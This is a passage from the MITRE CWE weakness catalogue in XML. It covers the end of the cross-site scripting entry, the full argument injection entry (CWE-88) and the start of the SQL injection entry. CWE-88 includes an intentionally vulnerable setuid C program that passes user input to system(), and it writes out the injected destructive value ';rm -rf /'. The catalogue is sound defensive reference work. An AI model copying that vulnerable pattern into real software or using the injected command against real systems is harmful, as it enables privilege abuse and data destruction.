               <Entry_Name>Cross Site Scripting (XSS)</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A4</Entry_ID>
               <Entry_Name>Cross-Site Scripting (XSS) Flaws</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>8</Entry_ID>
               <Entry_Name>Cross-site Scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="209"/>
            <Related_Attack_Pattern CAPEC_ID="588"/>
            <Related_Attack_Pattern CAPEC_ID="591"/>
            <Related_Attack_Pattern CAPEC_ID="592"/>
            <Related_Attack_Pattern CAPEC_ID="63"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-709"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and&#xA;                  Response Splitting).&#34; Page 31"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 3: Web-Client Related Vulnerabilities (XSS).&#34; Page&#xA;                  63"/>
            <Reference External_Reference_ID="REF-712"/>
            <Reference External_Reference_ID="REF-112" Section="Chapter 13, &#34;Web-Specific Input Issues&#34; Page&#xA;                  413"/>
            <Reference External_Reference_ID="REF-714"/>
            <Reference External_Reference_ID="REF-715"/>
            <Reference External_Reference_ID="REF-716"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-718"/>
            <Reference External_Reference_ID="REF-719"/>
            <Reference External_Reference_ID="REF-720"/>
            <Reference External_Reference_ID="REF-721"/>
            <Reference External_Reference_ID="REF-722"/>
            <Reference External_Reference_ID="REF-723"/>
            <Reference External_Reference_ID="REF-724"/>
            <Reference External_Reference_ID="REF-725"/>
            <Reference External_Reference_ID="REF-726"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;Cross Site Scripting&#34;, Page 1071."/>
         </References>
         <Notes>
            <Note Type="Applicable Platform">
               <xhtml:p>XSS flaws are very common in web applications since they require a great deal of developer discipline to avoid them.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Description, Relationships, Other_Notes, References, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Name, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">Cross-site Scripting (XSS)</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Directives in a Web Page (aka 'Cross-site scripting' (XSS))</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve Web Page Structure (aka 'Cross-site Scripting')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Preserve Web Page Structure ('Cross-site Scripting')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="88" Name="Argument Injection or Modification" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not sufficiently delimit the arguments being passed to a component in another control sphere, allowing alternate arguments to be provided, leading to potentially security-relevant changes.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Alter Execution Logic</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-0113</Reference>
               <Description>Canonical Example</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0113</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0150</Reference>
               <Description>Web browser executes Telnet sessions using command line arguments that are specified by the web site, which could allow remote attackers to execute arbitrary commands.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0150</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0667</Reference>
               <Description>Web browser allows remote attackers to execute commands by spawning Telnet with a log file option on the command line and writing arbitrary code into an executable file which is later executed.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0667</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0985</Reference>
               <Description>Argument injection vulnerability in the mail function for PHP may allow attackers to bypass safe mode restrictions and modify command line arguments to the MTA (e.g. sendmail) possibly executing commands.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0985</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0907</Reference>
               <Description>Help and Support center in windows does not properly validate HCP URLs, which allows remote attackers to execute arbitrary code via quotation marks in an "hcp://" URL.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0907</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0121</Reference>
               <Description>Mail client does not sufficiently filter parameters of mailto: URLs when using them as arguments to mail executable, which allows remote attackers to execute arbitrary programs.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0121</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0473</Reference>
               <Description>Web browser doesn't filter "-" when invoking various commands, allowing command-line switches to be specified.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0473</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0480</Reference>
               <Description>Mail client allows remote attackers to execute arbitrary code via a URI that uses a UNC network share pathname to provide an alternate configuration file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0480</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0489</Reference>
               <Description>SSH URI handler for web browser allows remote attackers to execute arbitrary code or conduct port forwarding via the a command line option.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0489</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0411</Reference>
               <Description>Web browser doesn't filter "-" when invoking various commands, allowing command-line switches to be specified.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0411</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4699</Reference>
               <Description>Argument injection vulnerability in TellMe 1.2 and earlier allows remote attackers to modify command line arguments for the Whois program and obtain sensitive information via "--" style options in the q_Host parameter.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4699</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-1865</Reference>
               <Description>Beagle before 0.2.5 can produce certain insecure command lines to launch external helper applications while indexing, which allows attackers to execute arbitrary commands. NOTE: it is not immediately clear whether this issue involves argument injection, shell metacharacters, or other issues.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1865</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2056</Reference>
               <Description>Argument injection vulnerability in Internet Explorer 6 for Windows XP SP2 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2056</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2057</Reference>
               <Description>Argument injection vulnerability in Mozilla Firefox 1.0.6 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2057</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2058</Reference>
               <Description>Argument injection vulnerability in Avant Browser 10.1 Build 17 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2312</Reference>
               <Description>Argument injection vulnerability in the URI handler in Skype 2.0.*.104 and 2.5.*.0 through 2.5.*.78 for Windows allows remote authorized attackers to download arbitrary files via a URL that contains certain command-line switches.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2312</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3015</Reference>
               <Description>Argument injection vulnerability in WinSCP 3.8.1 build 328 allows remote attackers to upload or download arbitrary files via encoded spaces and double-quote characters in a scp or sftp URI.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3015</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4692</Reference>
               <Description>Argument injection vulnerability in the Windows Object Packager (packager.exe) in Microsoft Windows XP SP1 and SP2 and Server 2003 SP1 and earlier allows remote user-assisted attackers to execute arbitrary commands via a crafted file with a "/" (slash) character in the filename of the Command Line property, followed by a valid file extension, which causes the command before the slash to be executed, aka "Object Packager Dialogue Spoofing Vulnerability."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4692</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6597</Reference>
               <Description>Argument injection vulnerability in HyperAccess 8.4 allows user-assisted remote attackers to execute arbitrary vbscript and commands via the /r option in a telnet:// URI, which is configured to use hawin32.exe.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0882</Reference>
               <Description>Argument injection vulnerability in the telnet daemon (in.telnetd) in Solaris 10 and 11 (SunOS 5.10 and 5.11) misinterprets certain client "-f" sequences as valid requests for the login program to skip authentication, which allows remote attackers to log into certain accounts, as demonstrated by the bin account.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0882</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1246</Reference>
               <Description>Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1246</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Argument Injection or Modification</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV03-C</Entry_ID>
               <Entry_Name>Sanitize the environment when invoking external programs</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV33-C</Entry_ID>
               <Entry_Name>Do not call system()</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR02-C</Entry_ID>
               <Entry_Name>Sanitize data passed to complex subsystems</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>30</Entry_ID>
               <Entry_Name>Mail Command Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="133"/>
            <Related_Attack_Pattern CAPEC_ID="41"/>
            <Related_Attack_Pattern CAPEC_ID="460"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-859"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 10, &#34;The Argument Array&#34;, Page 567."/>
         </References>
         <Notes>
            <Note Type="Relationship">At one layer of abstraction, this can overlap other weaknesses that have whitespace problems, e.g. injection of javascript into attributes of HTML tags.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="89" Name="Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.</xhtml:p>
